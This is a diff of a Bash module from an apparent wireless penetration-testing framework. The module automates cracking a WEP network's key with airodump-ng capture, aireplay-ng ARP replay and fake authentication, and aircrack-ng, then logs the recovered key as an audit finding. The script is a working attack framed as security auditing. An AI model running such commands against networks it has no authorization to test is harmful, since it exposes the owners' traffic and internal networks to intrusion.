@@ -13,23 +13,9 @@
 #===============================================================================
 #  modules/d2_wep_cracking.sh
 #  D2: WEP Network Cracking (Golden Wrapper)
-#
-#  METHODOLOGY:
-#  1. Capture initialization vectors (IVs) from the target WEP network.
-#  2. Use ARP replay to rapidly generate new IVs.
-#  3. Smart Exit: Periodically attempt to recover the key while capturing.
-#     Exit successfully the moment the key is found.
 #===============================================================================
 
 set -euo pipefail
-
-# Intelligence Insight (Colors)
-C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
-C_VAR="${ASTRA_COLOR_VAR:-}"
-C_BOLD="${ASTRA_COLOR_BOLD:-}"
-C_ACTION="${ASTRA_COLOR_ACTION:-}"
-C_RESET="${ASTRA_COLOR_RESET:-}"
-
 
 # Inputs from Environment
 INTERFACE="${MONITOR_INTERFACE:-}"
@@ -43,6 +29,7 @@ TC_ID="D2"
 OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_capture"
 AIRODUMP_LOG="${EVIDENCE_DIR}/${TC_ID}_airodump.log"
 AIREPLAY_LOG="${EVIDENCE_DIR}/${TC_ID}_aireplay.log"
+KEY_FILE="${EVIDENCE_DIR}/${TC_ID}_key.txt"
 
 if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
     echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
@@ -51,100 +38,74 @@ fi
 
 echo "[*] Starting WEP cracking attempt on ${BSSID} (Channel: ${CHANNEL:-auto})..."
 
-# Ensure channel is set correctly
-if [[ -n "$CHANNEL" && "$CHANNEL" != "0" ]]; then
-    iw dev "$INTERFACE" set channel "$CHANNEL" 2>/dev/null || true
-fi
-
-# 1. Start airodump-ng to capture IVs
-if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    airodump-ng --bssid "$BSSID" \
-        --channel "${CHANNEL:-0}" \
-        --write "$OUTPUT_BASE" \
-        --output-format pcap,csv \
-        "$INTERFACE" 2>&1 | tee "$AIRODUMP_LOG" &
-else
-    airodump-ng --bssid "$BSSID" \
-        --channel "${CHANNEL:-0}" \
-        --write "$OUTPUT_BASE" \
-        --output-format pcap,csv \
-        "$INTERFACE" > "$AIRODUMP_LOG" 2>&1 &
-fi
-AIRODUMP_PID=$!
-
-# 2. Start ARP Replay in background to flood IVs
-echo "[*] Launching ARP replay attack to generate IVs..."
-if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" 2>&1 | tee "$AIREPLAY_LOG" &
-else
-    aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" > "$AIREPLAY_LOG" 2>&1 &
-fi
-AIREPLAY_PID=$!
-
-# Cleanup function
-cleanup() {
-    [[ -n "${AIRODUMP_PID:-}" ]] && kill "$AIRODUMP_PID" 2>/dev/null || true
-    [[ -n "${AIREPLAY_PID:-}" ]] && kill "$AIREPLAY_PID" 2>/dev/null || true
-}
-trap cleanup EXIT
-
-# 3. Smart Exit Polling Loop
-CAP_FILE="${OUTPUT_BASE}-01.cap"
-KEY_FILE="${EVIDENCE_DIR}/${TC_ID}_key.txt"
-ELAPSED=0
-SUCCESS=0
-
-echo "[*] Monitoring IV collection. Will attempt to crack every 30 seconds..."
-
-# Start dynamic telemetry heartbeat
+# 1. Start Telemetry in Background
 (
-    HEARTBEAT_ELAPSED=0
-    while [[ $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
-        PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
-        [[ $PCT -gt 90 ]] && PCT=90
-        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing attack..."
-        sleep 2
-        HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
+    ELAPSED=0
+    while true; do
+        PCT=$(( 10 + (ELAPSED % 85) ))
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Cracking WEP network..."
+        sleep 5; ELAPSED=$((ELAPSED + 5))
     done
 ) &
-TELEMETRY_PID=$!
+TEL_PID=$!
 
-while [[ $ELAPSED -lt $SCAN_TIME ]]; do
-    sleep 30
-    ((ELAPSED+=30))
-
-    if [[ -f "$CAP_FILE" ]]; then
-        # Attempt to crack
-        if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-            if aircrack-ng -b "$BSSID" "$CAP_FILE" 2>&1 | tee "$KEY_FILE"; then
-                if grep -q "KEY FOUND" "$KEY_FILE"; then
-                    echo "[!] SUCCESS: WEP KEY RECOVERED IN ${ELAPSED}s!"
-                    SUCCESS=1
-                    break
-                fi
-            fi
-        else
-            if aircrack-ng -b "$BSSID" "$CAP_FILE" > "$KEY_FILE" 2>&1; then
-                if grep -q "KEY FOUND" "$KEY_FILE"; then
-                    echo "[!] SUCCESS: WEP KEY RECOVERED IN ${ELAPSED}s!"
-                    SUCCESS=1
-                    break
-                fi
+# 2. Run Primary Tools
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    # Foreground execution
+    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$OUTPUT_BASE" --output-format pcap,csv "$INTERFACE" &
+    AIRO_PID=$!
+    aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" &
+    AIRE_PID=$!
+    
+    CAP_FILE="${OUTPUT_BASE}-01.cap"
+    ELAPSED=0
+    SUCCESS=0
+    while [[ $ELAPSED -lt $SCAN_TIME ]]; do
+        sleep 30; ((ELAPSED+=30))
+        if [[ -f "$CAP_FILE" ]]; then
+            if aircrack-ng -b "$BSSID" "$CAP_FILE" 2>&1 | tee "$KEY_FILE" | grep -q "KEY FOUND"; then
+                SUCCESS=1; break
             fi
         fi
-    fi
-    
-    # Send occasional fake authentication to keep the connection "warm"
-    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-        aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" 2>&1 | tee -a "$AIREPLAY_LOG" || true
-    else
-        aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" >> "$AIREPLAY_LOG" 2>&1 || true
-    fi
-done
+        aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" || true
+    done
+    kill "$AIRO_PID" "$AIRE_PID" 2>/dev/null || true
+    RET=$?
+else
+    # Background execution
+    (
+        airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$OUTPUT_BASE" --output-format pcap,csv "$INTERFACE" > "$AIRODUMP_LOG" 2>&1 &
+        AIRO_PID=$!
+        aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" > "$AIREPLAY_LOG" 2>&1 &
+        AIRE_PID=$!
+        
+        CAP_FILE="${OUTPUT_BASE}-01.cap"
+        ELAPSED=0
+        SUCCESS=0
+        while [[ $ELAPSED -lt $SCAN_TIME ]]; do
+            sleep 30; ((ELAPSED+=30))
+            if [[ -f "$CAP_FILE" ]]; then
+                if aircrack-ng -b "$BSSID" "$CAP_FILE" > "$KEY_FILE" 2>&1 && grep -q "KEY FOUND" "$KEY_FILE"; then
+                    SUCCESS=1; break
+                fi
+            fi
+            aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 || true
+        done
+        kill "$AIRO_PID" "$AIRE_PID" 2>/dev/null || true
+    ) > /dev/null 2>&1 &
+    TOOL_PID=$!
+    wait $TOOL_PID; RET=$?
+fi
 
-kill "$TELEMETRY_PID" 2>/dev/null || true
+# 3. Cleanup and Final Signal
+kill $TEL_PID 2>/dev/null || true
 
-# 4. Reporting
+# Reporting
+SUCCESS=0
+if [[ -f "$KEY_FILE" ]] && grep -q "KEY FOUND" "$KEY_FILE"; then
+    SUCCESS=1
+fi
+
 if [[ $SUCCESS -eq 1 ]]; then
     "$ASTRA_BIN" record-finding \
         --session-dir "$SESSION_DIR" \
@@ -152,21 +113,20 @@ if [[ $SUCCESS -eq 1 ]]; then
         --type vulnerability \
         --name "WEP Key Recovered" \
         --severity CRITICAL \
-        --desc "The cleartext WEP key was recovered for BSSID ${BSSID} after ${ELAPSED} seconds of IV collection." \
+        --desc "The cleartext WEP key was recovered for BSSID ${BSSID}." \
         --evidence "$KEY_FILE" \
-        --rationale "WEP is cryptographically broken. Recovering the key allows full, unauthorized access to all transit traffic and the internal network."
+        --rationale "WEP is cryptographically broken."
 else
-    echo "[+] Mission complete. No WEP keys recovered."
     "$ASTRA_BIN" record-finding \
         --session-dir "$SESSION_DIR" \
         --tc "$TC_ID" \
         --type vulnerability \
         --name "[$TC_ID] Audit Complete" \
         --severity INFO \
-        --desc "Attempted to recover WEP keys for ${BSSID}, but insufficient IVs were collected within the scan window." \
-        --evidence "$CAP_FILE" \
-        --rationale "WEP cracking depends on high traffic volume to generate IVs. If the network is idle, recovery may take significant time or fail."
+        --desc "Attempted to recover WEP keys for ${BSSID}." \
+        --evidence "${OUTPUT_BASE}-01.cap" \
+        --rationale "WEP cracking depends on high traffic volume."
 fi
 
 "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
-exit 0
+exit $RET
